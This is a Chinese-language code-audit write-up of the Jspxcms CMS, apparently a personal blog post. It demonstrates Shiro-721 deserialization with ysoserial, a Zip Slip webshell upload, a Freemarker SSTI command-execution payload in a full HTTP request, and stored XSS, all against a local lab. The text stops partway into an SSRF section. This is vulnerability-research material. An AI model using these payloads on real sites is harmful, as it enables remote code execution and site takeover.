---
created: 2024-10-01T09:24:00+00:00
categories:
  - 技术研究
tags:
  - 代码审计
updated: 2022-08-17T00:00:00+00:00
date: 2022-08-17T00:00:00+00:00
slug: jspxcms-code-audit-learn
title: Jspxcms审计记录
cover: https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/89184eac-710f-4d75-917f-96bab51dc8f0/3.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050157Z&X-Amz-Expires=3600&X-Amz-Signature=e99bb431c71ace57b3758710ca982e234f4f72929322cf4eb50fd3d5bfae24a4&X-Amz-SignedHeaders=host&x-id=GetObject
id: 112906e1-7468-8092-9d27-cf3078fe8796
---

## 技术栈

该项目使用了 SpringMVC 框架、Spring Data JPA 框架，Hibernate 作为数据库持久化框架，Shiro 作为安全框架，以及 Freemarker 模版引擎。

## 组件依赖

通过观察 Maven 同步的依赖库，发现部分使用的组件和版本如下。

| 组件                | 版本   |
| ------------------- | ------ |
| commons-beanutils   | 1.9.3  |
| commons-collections | 3.2.2  |
| commons-logging     | 1.1.3  |
| freemarker          | 2.3.28 |
| shiro-core          | 1.3.2  |
| hibernate-core      | 5.0.12 |
| log4j               | 1.2.17 |
| snakeyaml           | 1.17   |

## 功能点熟悉

在正式进行审计前，应当对这个 Web 应用的相关功能点了解的足够全面、足够熟悉。

由于该项目是个开源项目，在官网也提供了使用手册，通过查阅文档可以更加全面的了解该应用的所有功能点。当然，也可以在安装该环境后，自行探索相关功能点。

## 默认不安全配置

通过查阅文档发现该应用存在管理后台。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/a21990da-b566-4d06-8994-91559ba2981a/0.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=cd1e4813717138a996b0c20543eadda4114b8f1f79b2481e92ab05db027648bd&X-Amz-SignedHeaders=host&x-id=GetObject)

管理员账户名为 admin，默认无密码就可以直接登录进去。除此之外，此处的登录功能连验证码都未设置，存在被暴力破解的风险。

## RCE

### Shiro 721 反序列化漏洞

通过如上使用到的依赖组件，可得知使用到了 1.3.2 版本的 Shiro，满足 Padding Oracle Attack 漏洞的条件，且存在 1.9.3 版本的 commons-beanutils，可以直接使用 CommonsBeanutils1 链进行攻击。虽然该漏洞存在，但在实际场景中不太容易复现成功。

首先使用 ysoserial 生成反序列化 payload。

```shell
java -jar ysoserial.jar CommonsBeanutils1 "open -a Calculator" > rce.ser
```

第二步，获取一个有效的 rememberMe。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/0aaef0fd-e0ab-4dc9-ac3c-f92f80ca9a87/1.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=756b95c8c957a9f25da9145add56a0207b8e5e73b3c5ea279e8e9d77e4d38bc8&X-Amz-SignedHeaders=host&x-id=GetObject)

然后通过[https://github.com/wuppp/shiro_rce_exp](https://github.com/wuppp/shiro_rce_exp)这个工具，进行爆破。

```shell
python shiro_exp.py <http://127.0.0.1:8088/> tfG3gjvoIwe+kHjzfNRddP9QL7uy2/GeTBASaYZ83WW6vaGZCgUDp2TfrOVBvflVyxuJ+yGzGvyjDcK031vUCzdfadQ6TWIjFrVuRoqCeZdDCwqP7gWSf4HoONl8QGdWsPHH6D4agsz1ZRmWwen5uyzcVpZdjKFzv5117tSHFHPj+hcgmfL0L+v90TKHmgiWLSiEADvbL/qfmCo8HQCYtkK6DxuWQ35IvSoOCRaV5GpeKRlvcJVejGiqKQsx20N12IBKxIQBJ1htcyh3SJic8sQT6anMnNKe/FoRmOTxhbIwnzwCqGrDfJw1otx1YBLJTcfeXDuDk/41eJ3pLQ2VTuPdU/gIu/p8zf/7APjcQDI8C2wljK8zKkn4JwDt1/jb25zxw05FohDyusuQAc+TRBkyM6s1zk7ARDnyG9PQeqUdCxeubu5rbDxFVQM0bTWkL1fnqtt/fciGVU84aonJA2uUYIOI5xrdqUDm1ySOHHZGYWu8l109tt/aIJrdL2xxyK7BL6Ul3Ttd4Nw0SQqO0FaUWV2IO/oBandsk7kavfmdN+LvX30T7iLqIUehhprLChbJX4z8asfm4VRL/dJBzr6Z14U/cW8l90ULB4Z4qU3RbIdl+yiODUUk7exp/exwjeKrdd068p0yTiZYbx+q8BcAgugBILOeS791WJMm2zFwDumcDtOM7S+5BpqRQXUrCwpthYy9drXPpyCrcbkFLRqdArYBWWpwx07VaqmPioCSX7klaicZtH9ho6D4fEWZ/9oWm9Angj6+GaTn0Qlp1g== rce.ser
```

爆破了几个小时后，终于爆出 rememberMe cookies。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/8ed54a06-4d81-42e9-8df7-5149ca4df08d/2.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=b68b191a05faad787dfa011d72a75036f47935a42a2c18303e2cabb083908767&X-Amz-SignedHeaders=host&x-id=GetObject)

将如上爆出的 rememberMe cookies 放置在 BurpSuite 中，并发包，可以发现计算机成功弹出。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/da08d886-c5aa-4e57-9dc7-0acb3f1fa2e7/3.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=ce184679e07a9ce11b792e0b63c0934de400e7f4ab84bde685dd45ea43f8343c&X-Amz-SignedHeaders=host&x-id=GetObject)

### Zip Slip 任意文件覆盖漏洞

通过[http://127.0.0.1:8088/cmscp/index.do](http://127.0.0.1:8088/cmscp/index.do)，使用 admin 账户加空密码登录进后台，在后台可以发现有相关上传功能。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/6aa6eb37-0104-4902-bc27-1ad6af9a89e4/4.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=025511d4cea66bf6cd20d3097adcdffc7815a85eb992d6d9ce31606d4884c365&X-Amz-SignedHeaders=host&x-id=GetObject)

尝试上传一个普通的文本文件，是能正常访问的，但当上传 jsp 后缀时，访问就会 404。

查看上传的文件的目录权限，可发现并无执行权限。

```shell
ls -al src/main/webapp/uploads/1
total 16
drwxr-xr-x  4 r00t  staff  128 Mar 16 12:45 .
drwxrwxr-x  4 r00t  staff  128 Mar 16 12:27 ..
-rw-r--r--  1 r00t  staff  288 Mar 16 12:30 test.jsp
-rw-r--r--  1 r00t  staff    5 Mar 16 12:28 test.txt
```

继续将目光盯向 ZIP 文件上传功能，上传一个压缩包，并抓包。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/a0a623f4-e71f-40aa-8c95-e8c503df6ffc/5.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=4dfc449d02ec28162f5fdccafbfc61e064ab2bb6e7324f9b08c9ed33e5d10806&X-Amz-SignedHeaders=host&x-id=GetObject)

回到网页，可以发现压缩包中的文件被自动解压了。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/d139dcf1-24de-4381-a4b0-70284a2a76f9/6.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=870d9b37ef4c8836ae8c70906af08ac9fbb8ea70de5c36e05847229b380d2133&X-Amz-SignedHeaders=host&x-id=GetObject)

回到 IDEA 中，审计 zip 上传相关方法。

```java
@RequiresPermissions("core:web_file_2:zip_upload")
@RequestMapping("zip_upload.do")
public void zipUpload(@RequestParam(value = "file", required = false) MultipartFile file, String parentId,
		HttpServletRequest request, HttpServletResponse response, RedirectAttributes ra) throws IOException {
	super.zipUpload(file, parentId, request, response, ra);
}
```

跟进`zipUpload`方法，在其中使用到了`AntZipUtils.unzip`方法进行解压缩。

```java
protected void zipUpload(MultipartFile file, String parentId, HttpServletRequest request,
		HttpServletResponse response, RedirectAttributes ra) throws IOException {
	Site site = Context.getCurrentSite();
	FileHandler fileHandler = getFileHandler(site);
	if (!(fileHandler instanceof LocalFileHandler)) {
		throw new CmsException("ftp cannot support ZIP.");
	}
	LocalFileHandler localFileHandler = (LocalFileHandler) fileHandler;
	String base = getBase(site);
	// parentId = parentId == null ? base : parentId;

	if (!Validations.uri(parentId, base)) {
		throw new CmsException("invalidURI");
	}
	File parentFile = localFileHandler.getFile(parentId);
	File tempFile = FilesEx.getTempFile();
	file.transferTo(tempFile);
	AntZipUtils.unzip(tempFile, parentFile);
	tempFile.delete();

	logService.operation("opr.webFile.zipUpload", parentId + "/" + file.getOriginalFilename(), null, null, request);
	logger.info("zip upload file, name={}.", parentId + "/" + file.getOriginalFilename());
	Servlets.writeHtml(response, "true");
}
```

跟进之，如下，可以发现该方法并未对文件名做安全检查，这里可能容易存在 zip 文件任意解压漏洞。

```java
public static void unzip(File zipFile, File destDir, String encoding) {
	if (destDir.exists() && !destDir.isDirectory()) {
		throw new IllegalArgumentException("destDir is not a directory!");
	}
	ZipFile zip = null;
	InputStream is = null;
	FileOutputStream fos = null;
	File file;
	String name;
	byte[] buff = new byte[DEFAULT_BUFFER_SIZE];
	int readed;
	ZipEntry entry;
	try {
		try {
			if (StringUtils.isNotBlank(encoding)) {
				zip = new ZipFile(zipFile, encoding);
			} else {
				zip = new ZipFile(zipFile);
			}
			Enumeration<?> en = zip.getEntries();
			while (en.hasMoreElements()) {
				entry = (ZipEntry) en.nextElement();
				name = entry.getName();
				name = name.replace('/', File.separatorChar);
				file = new File(destDir, name);
				if (entry.isDirectory()) {
					file.mkdirs();
				} else {
					// 创建父目录
					file.getParentFile().mkdirs();
					is = zip.getInputStream(entry);
					fos = new FileOutputStream(file);
					while ((readed = is.read(buff)) > 0) {
						fos.write(buff, 0, readed);
					}
					fos.close();
					is.close();
				}
			}
		} finally {
			if (fos != null) {
				fos.close();
			}
			if (is != null) {
				is.close();
			}
			if (zip != null) {
				zip.close();
			}
		}
	} catch (IOException e) {
		logger.error("", e);
	}
}
```

构造一个恶意的 zip 压缩包。

```shell
zipinfo evilzip.zip
Archive:  evilzip.zip
Zip file size: 561 bytes, number of entries: 2
drwxr-xr-x  2.0 unx        0 bx stor 22-Mar-16 13:13 /
-rw-r--r--  2.0 unx      604 bX defN 22-Mar-16 13:14 ../../rce.jsp
```

然后上传，但是依旧是无法访问，可以发现在访问 jsp 后缀的文件时，会在前面加一个/jsp 前缀。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/302af77e-45e2-4afc-badf-a1fd31162043/7.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=48d05ef7e29590cec4a2b3f752c28e53588cb61333b8e5ff3e92498497022e53&X-Amz-SignedHeaders=host&x-id=GetObject)

回到 IDAE 中，发现相关过滤器如下。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/31c0c4fd-267a-4a2a-b8bd-f73a1a24c3bb/8.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=96a14b636433c05cf7312409045f4afc9d5879a12418f7a280592f5340d7b363&X-Amz-SignedHeaders=host&x-id=GetObject)

既然如此，那么尝试将 jsp 转成 war，这样的目的是作为一个独立的 web 应用，就不会过如上过滤器了。

```shell
jar -cf rce.war ./rce.jsp
```

然后再此上传，由于此次的环境是通过 IDEA 启动 SpringBoot 的，所以在这种情况下是依旧无法访问 webshell 的。但在实际 tomcat 部署方式中，这种方式肯定是可行的。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/8bd9932d-eacf-47d4-affa-0a70ccee4a49/9.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=067ff7010c8b444bac388381f3c8c02eb9c277497da5d226ebb603621ed540a6&X-Amz-SignedHeaders=host&x-id=GetObject)

### Freemarker SSTI

继续翻看后台相关功能，发现一个模版上传的功能，由于该应用使用的是 Freemarker 模板框架，所以此处可能存在模版注入漏洞的。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/1095baa2-62de-49e0-aa9b-baceebfb3426/10.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=8c9d35c2b26c2fffd08582cf8b4263ee9a7095f929ee51209659d18c575a8b93&X-Amz-SignedHeaders=host&x-id=GetObject)

上传一个恶意的模版。

```text
POST /cmscp/core/web_file_1/upload.do?_site=1 HTTP/1.1
Host: 127.0.0.1:8088
Content-Length: 496
Accept: text/html, */*; q=0.01
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAZrBHSAhmC9xfoEi
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: open_ids=%2F1%2C%2F1%2Fdefault; select_id=%2F1%2Fm; OFBiz.Visitor=10000; _jspxcms=f1bcdbbcf4bb4413a5630543db361cd4; _site=1; JSESSIONID=1F497CF9E044E65C2DBAAE4ADAF1B2D7
Connection: close

------WebKitFormBoundaryAZrBHSAhmC9xfoEi
Content-Disposition: form-data; name="parentId"

/1/rce
------WebKitFormBoundaryAZrBHSAhmC9xfoEi
Content-Disposition: form-data; name="file"; filename="index.html"
Content-Type: text/html

[#escape a as (a)!?html]
<!doctype html>
<html lang="zh-CN">
<head>
<meta charset="utf-8"/>
</head>
<body>

${"freemarker.template.utility.Execute"?new()("open -a Calculator")}

</body>
</html>
[/#escape]
------WebKitFormBoundaryAZrBHSAhmC9xfoEi--
```

回到 IDEA 中搜索相关功能点，相关处理方法如下，没有经过任意安全检查便直接写入了。

```java
protected void upload(MultipartFile file, String parentId, HttpServletRequest request, HttpServletResponse response)
		throws IllegalStateException, IOException {
	Site site = Context.getCurrentSite();
	// parentId = parentId == null ? base : parentId;
	String base = getBase(site);
	if (!Validations.uri(parentId, base)) {
		throw new CmsException("invalidURI", parentId);
	}
	FileHandler fileHandler = getFileHandler(site);
	fileHandler.store(file, parentId);
	logService.operation("opr.webFile.upload", parentId + "/" + file.getOriginalFilename(), null, null, request);
	logger.info("upload file, name={}.", parentId + "/" + file.getOriginalFilename());
	Servlets.writeHtml(response, "true");
}
```

在成功上传后，然后去到系统管理-网站设置中，修改模板主题为刚刚上传的恶意模板。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/9a293bd1-c8f9-4349-b414-255ccabd28db/11.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=f964367990a446d22ee9ece6b9543517b4c51821442a9057591f9069ee5c94e0&X-Amz-SignedHeaders=host&x-id=GetObject)

最后进行访问便可以触发命令执行。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/a149ceaa-f71a-4b61-ae26-4d0bb809eb38/12.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=dd33e580a7993f022b11ff72311dd14443fd6af74454247465c71959f746d1ab&X-Amz-SignedHeaders=host&x-id=GetObject)

## XSS

寻找到一处评论框，尝试注入 XSS 弹窗 payload，并使用 Burpsuite 拦截请求。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/8c0225e3-5936-40c8-bf9f-3cf4fd85382b/13.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=d56673a5f2cf5a43a3339ebb6fecd48497ccd868a88feb7c3f4152569dada467&X-Amz-SignedHeaders=host&x-id=GetObject)

通过 HTTP 报文得知，评论内容的参数为`text`。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/809d7ee2-c6bb-4e05-847a-0ca7240703a7/14.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=b148bf9fdbb8c5bf7561764f463e8373a693d6bd0ae8fcaf34480ae315c99832&X-Amz-SignedHeaders=host&x-id=GetObject)

IDEA 中搜索`comment_submit`路由，找到处理逻辑。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/85e7663a-fbd2-455a-812c-732f08b5adfa/15.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=669e82f17746a6369e62ace12ee27e43fe7971f791c6501e3f8f67a25d8debd5&X-Amz-SignedHeaders=host&x-id=GetObject)

处理方法如下，`submit`方法未对 text 做任何检查过滤，直接传入`submit`的重载方法中。

```java
@RequestMapping("/comment_submit")
public String submit(String fname, String ftype, Integer fid,
		Integer parentId, String text, String captcha,
		HttpServletRequest request, HttpServletResponse response,
		org.springframework.ui.Model modelMap)
		throws InstantiationException, IllegalAccessException,
		ClassNotFoundException {
	return submit(null, fname, ftype, fid, parentId, text, captcha,
			request, response, modelMap);
}
```

跟进重载方法中，在其中也是对`text`变量进行了非空判断和去敏感词。然后将`text`变量的值赋给 comment 对象中的`text`变量。最后到 205 行的由`CommentService.save`接口实现的`service.save`方法调用 comment 实例。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/28026f97-3acc-43a2-8257-b16501070c34/16.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=7b4654b6f6795dc9f40d3a7c7dfb947ad0064bf86e5dc5fee06e9bb5fd62a832&X-Amz-SignedHeaders=host&x-id=GetObject)

接口`CommentService`的实现类为`CommentServiceImpl`，继续跟进其中的`save`方法。

```java
@Transactional
public Comment save(Comment bean, Integer userId, Integer siteId, Integer parentId) {
	Site site = siteService.get(siteId);
	bean.setSite(site);
	User user = userService.get(userId);
	bean.setCreator(user);
	if (parentId != null) {
		Comment parent = get(parentId);
		bean.setParent(parent);
	}
	if (StringUtils.isNotBlank(bean.getIp())) {
		bean.setCountry(ipSeeker.getCountry(bean.getIp()));
		bean.setArea(ipSeeker.getArea(bean.getIp()));
	}

	bean.applyDefaultValue();
	bean = dao.save(bean);
	dao.flushAndRefresh(bean);
	if (bean.getStatus() == Comment.AUDITED) {
		Object anchor = bean.getAnchor();
		if (anchor instanceof Commentable) {
			((Commentable) anchor).addComments(1);
		}
	}
	return bean;
}
```

在该方法中，也未对`bean`做任何安全处理，最终通过`dao.save`方法保存至数据库。但最后在页面上却没有触发 XSS 弹窗。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/120bb994-0a17-4221-b285-9c41d2fedf82/17.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=ba443fc553df79d2e285a6ce23c64de804a0f8f39694c31d29bb667f0fb8dadf&X-Amz-SignedHeaders=host&x-id=GetObject)

同时，通过抓包发现，处理评论的是`comment_list`路由，并且 payload 被转义。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/5b08d7c4-ca86-405c-8aef-075d51f68aee/18.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=5fa828ed603389f0c630db9a8339d6489b0480854c1bac4fcf641c386c557818&X-Amz-SignedHeaders=host&x-id=GetObject)

回到 IDEA 查看处理`comment_list`路由的方法，如下。

```java
@RequestMapping("/comment_list")
public String list(String ftype, Integer fid, Integer page,
		HttpServletRequest request, org.springframework.ui.Model modelMap) {
	return list(null, ftype, fid, page, request, modelMap);
}

@RequestMapping(Constants.SITE_PREFIX_PATH + "/comment_list")
public String list(@PathVariable String siteNumber, String ftype,
		Integer fid, Integer page, HttpServletRequest request,
		org.springframework.ui.Model modelMap) {
	siteResolver.resolveSite(siteNumber);
	Site site = Context.getCurrentSite();
	if (StringUtils.isBlank(ftype)) {
		ftype = "Info";
	}
	if (fid == null) {
		// TODO
	}
	Object bean = service.getEntity(ftype, fid);
	if (bean == null) {
		// TODO
	}
	Anchor anchor = (Anchor) bean;
	// Site site = ((Siteable) bean).getSite();
	String tpl = Servlets.getParam(request, "tpl");
	if (StringUtils.isBlank(tpl)) {
		tpl = "_list";
	}
	modelMap.addAttribute("anchor", anchor);
	Map<String, Object> data = modelMap.asMap();
	ForeContext.setData(data, request);
	ForeContext.setPage(data, page);
	return site.getTemplate(TPL_PREFIX + tpl + TPL_SUFFIX);
}
```

在`list`方法的最后，将`sys_comment_list.html`传入`site.getTemplate`方法中。

而在`sys_comment_list.html`中有使用到 Freemarker 模版引擎中的转义。

```html
[#escape x as (x)!?html] [#assign commentIndex = 1/] [#macro printComment
parent]
<div style="background-color:#FFE;border:1px solid #999;padding:3px;">
  [#if parent.parent??] ... [/#if] [/#escape]
</div>
```

在同级目录下排查不包含转义的 html 文件，结果如下，确定一个与评论有关的 html，即`sys_member_space_comment.html`。

```shell
grep -L "/#escape" *.html                                                                                                                                                                                                                                  130
app_info_favorites.html
app_notification.html
inc_js.html
list.html
page.html
sys_member_login_ajax.html
sys_member_space_article.html
sys_member_space_comment.html
sys_operation_error.html
sys_operation_success.html
sys_operation_warning.html
sys_rss.html
```

而在`sys_member_space.html`中又对`sys_member_space_comment.html`进行了包含，需要当 type 请求参数的值为 comment 或 article。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/93902862-306d-4b9d-a670-6be05a730251/19.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=c47997bcf292f4ecd8a3b99c2bfbdb22a34c1e5e6e942515b53f05261139adfc&X-Amz-SignedHeaders=host&x-id=GetObject)

继续在 IDEA 中搜索`sys_member_space.html`，发现当请求路径为`/space/{id}`，就会获取`sys_member_space.html`模版，最终成功执行存储性 XSS。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/69616ec8-2e0a-4b5d-a6d3-842532d98ac6/20.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=74b125932db82486218ad2e168eedc71c25aa894119a8af7c33776bbe47fbb73&X-Amz-SignedHeaders=host&x-id=GetObject)

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/f091cd61-96b7-45c4-bf27-ea347363a4ce/21.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=421677b44fae18346194382b5fd632bb6ffeb9db724b7308790ab4f68d309737&X-Amz-SignedHeaders=host&x-id=GetObject)

## SSRF

在审计 SSRF 漏洞前，需要知道 Java 中的一些常见的对外发送请求的方法。

```text
Socket()
OkHttpClient.newCall(request).execute()
ImageIO.read()
HttpClient.execute()
HttpClient.executeMethod()
HttpURLConnection.connect()
HttpURLConnection.getInputStream()
URL.openConnection()
URL.openStream()
HttpServletRequest()
BasicHttpEntityEnclosingRequest()
DefaultBHttpClientConnection()
BasicHttpRequest()
```

### HttpClient.execute()

在 IDEA 中直接搜索到`httpclient.execute`方法，这个方法实现自 HttpClient 类，发现有个获取 HTML 网页的方法。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/5fbdf10d-94e9-4886-8c9a-8f3512e84117/22.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=c61ea5a6eac8c756c5738d8c9c504bdd8321171697f27e2e182ad121f8474e31&X-Amz-SignedHeaders=host&x-id=GetObject)

```java
@Transient
public static String fetchHtml(CloseableHttpClient httpclient, URI uri,
		String charset) throws ClientProtocolException, IOException {
	HttpGet httpget = new HttpGet(uri);
	CloseableHttpResponse response = httpclient.execute(httpget);
	String html = null;
	try {
		if (response.getStatusLine().getStatusCode() == HttpServletResponse.SC_OK) {
			HttpEntity entity = response.getEntity();
			html = EntityUtils.toString(entity, charset);
		}
	} finally {
		response.close();
	}
	return html;
}
```

该方法有被重载方法调用。

```java
@Transient
public static String fetchHtml(URI uri, String charset, String userAgent)
		throws ClientProtocolException, IOException {
